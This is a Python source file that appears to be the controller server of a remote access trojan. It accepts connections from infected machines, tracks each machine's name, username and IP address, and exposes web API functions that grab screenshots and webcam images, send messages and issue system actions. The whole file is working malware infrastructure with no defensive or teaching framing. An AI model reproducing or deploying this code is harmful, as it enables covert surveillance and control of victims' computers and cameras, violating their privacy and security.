# standard libraries
import threading
import asyncio
import socket
import random
import base64
import time
import json

# third-party libraries
from prettytable import PrettyTable
import websocket
import webapi

# global variables
table = PrettyTable()
table.field_names = ["ID", "Computer", "IP Address", "Username"]
clients = []

# utility functions
def get_client(connection):
   for client in clients:
      if (client['connection_id'] == connection):
         return client

def receive(connection, decode=True, buffer=1024):
   try:
      client = None

      for c in clients:
         if (c['connection_id'] == connection):
            client = c['socket']
            break

      if (client is None):
         raise socket.error
      
      data = client.recv(buffer)
      return data.decode() if decode else data
   
   except (UnicodeDecodeError, IndexError, AttributeError, socket.error):
      return str()
   
def receive_all(connection, decode=True, buffer=1024):
   try:
      client = None

      for c in clients:
         if (c['connection_id'] == connection):
            client = c['socket']
            break

      if (client is None):
         raise socket.error

      data = client.recv(buffer)
      while (len(data) < buffer):
         data += client.recv(buffer)

      return data.decode() if decode else data

   except (IndexError, AttributeError, socket.error):
      return str()

def send_and_receive(connection, data, provideSize=False, decode=True):
   try:
      client = None

      for c in clients:
         if (connection):
            if (c['connection_id'] == int(connection)):
               client = c['socket']
               break

      if (client is None):
         raise socket.error
      
      client.settimeout(5)

      if (provideSize):
         client.send(bytes(str(len(data)), 'utf-8'))
         time.sleep(0.1)
      
      if (isinstance(data, bytes)):
         client.send(data)
      else:
         client.send(data.encode())
         
      data = client.recv(1024)
      return data.decode() if decode else data

   except (IndexError, AttributeError, socket.error, socket.timeout):
      return 'error'

def isConnected(connection):
   try:
      response = send_and_receive(connection, 'ping')
      if ('ping' in response):
         return True
      else:
         raise socket.error

   except socket.error:
      return False

# server functions
def ManageConnections(command, connection=None):
   try:
      if (command == 'clients'):
         deadClients = []

         for client in clients:
            try:
               response = send_and_receive(client['connection_id'], 'ping')
               if not ('ping' in response):
                  raise socket.error
               
            except socket.error:
               deadClients.append(client)

         for client in deadClients:
            clients.remove(client)

         return list() if len(clients) < 1 else clients

      elif (command == 'connect' and connection is not None):
         try:
            response = send_and_receive(connection, 'ping')
            if ('ping' in response):
               return True
            else:
               for client in clients:
                  if (client['connection_id'] == connection):
                     clients.remove(client)
                     break

         except (socket.error, ValueError, IndexError):
            return False

   except (ValueError, IndexError):
      return False

   finally:
      command = None

def ControlClient(command, connection):
   if (isConnected(connection)):
      if (command == 'append'):
         response = send_and_receive(connection, 'append')

         if ('append' in response):
            for client in clients:
               if (client['connection_id'] == connection):
                  clients.remove(client)
                  return True

   return None

def ClientInformation(connection):
   response = send_and_receive(connection, 'ping')
   if not ('ping' in response):
      return str()

   for client in clients:
      if (client['connection_id'] == connection):
         return {
            'connection_id': client['connection_id'],
            'computer_name': client['computer_name'],
            'username': client['username'],
            'ip_address': client['ip_address'],
         }

   return None

def SendMessage(connection, message):
   response = send_and_receive(connection, 'message')
   if ('message' in response):
      status = send_and_receive(connection, message, True)
      return status
   
   return None
   
def Screenshot(connection):
   response = send_and_receive(connection, 'screenshot')
   if ('captured' in response):
      fileSize = int(receive(connection))
      data = receive_all(connection, False, fileSize)
      return base64.b64encode(data)
   
   return None

def Webcam(connection):
   response = send_and_receive(connection, 'webcam')
   if ('captured' in response):
      fileSize = int(receive(connection))
      data = receive_all(connection, False, fileSize)
      return base64.b64encode(data)
   
   return None
   
def SystemAction(connection, action):
   response = send_and_receive(connection, action)
   if (action in response):
      return True
   
   return False

# websocket functions
async def send_message_async(message):
    await websocket.send_message(message)

def start_websocket_server():
    asyncio.set_event_loop(asyncio.new_event_loop())
    asyncio.run(websocket.main())

def send_message_threadsafe():
    clientData = list()

    for client in clients:
         clientData.append({
            'connection_id': client['connection_id'],
            'computer': client['computer_name'],
            'username': client['username'],
            'ip_address': client['ip_address'],
         })

    asyncio.run(send_message_async(str(clientData)))

def RemoteConnect(server, port):
   objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   objSocket.bind((server, port))
   objSocket.listen(socket.SOMAXCONN)

   while (True):
      try:
         client, _ = objSocket.accept()
         data = json.loads(client.recv(1024).decode())
         connectionId = random.randint(100000000, 999999999)

         for c in clients:
            if (c['computer_name'] == data['computer_name']):
               clients.remove(c)

         clients.append({
            'socket': client,
            'ip_address': client.getpeername()[0],
            'computer_name': data['computer_name'],
            'username': data['username'],
            'connection_id': connectionId,
         })
         
         send_message_threadsafe()

      except socket.error:
         objSocket.close()
         del(objSocket)
         break

def DetectChanges():
   connectionId = webapi.get_connection_id()

   if (connectionId is None):
      for client in clients:
         try:
            response = send_and_receive(client['connection_id'], 'ping')
            if 'ping' not in response:
               raise socket.error
            
         except (socket.error, ValueError):
            clients.remove(client)
      
      send_message_threadsafe()

   threading.Timer(1, DetectChanges).start()

webapi.api.isConnected = isConnected
webapi.api.ManageConnections = ManageConnections
webapi.api.ControlClient = ControlClient
webapi.api.ClientInformation = ClientInformation
webapi.api.SendMessage = SendMessage
webapi.api.Screenshot = Screenshot
webapi.api.Webcam = Webcam
webapi.api.SystemAction = SystemAction

server_thread = threading.Thread(target=start_websocket_server)
server_thread.daemon = True
server_thread.start()

DetectChanges()